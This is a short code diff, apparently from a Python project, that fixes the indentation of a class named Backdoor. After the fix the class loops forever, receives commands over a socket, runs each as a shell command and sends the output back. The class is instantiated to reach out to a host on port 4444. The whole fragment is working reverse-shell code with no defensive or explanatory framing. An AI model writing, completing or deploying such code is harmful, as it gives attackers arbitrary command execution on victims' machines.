@@ -21,15 +21,15 @@ class Backdoor:
             except ValueError:
                 continue
 
-        def execute(self, cmd):
-            return subprocess.check_output(cmd, shell=True)
+    def execute(self, cmd):
+        return subprocess.check_output(cmd, shell=True)
 
-        def start(self):
-            while True:
-                cmd = self.recv_data()
-                output = self.execute(cmd)
-                self.send_data(output)
-            self.s.close()
+    def start(self):
+        while True:
+            cmd = self.recv_data()
+            output = self.execute(cmd)
+            self.send_data(output)
+        self.s.close()
 
 
 talk = Backdoor("192.168.1.17", 4444)
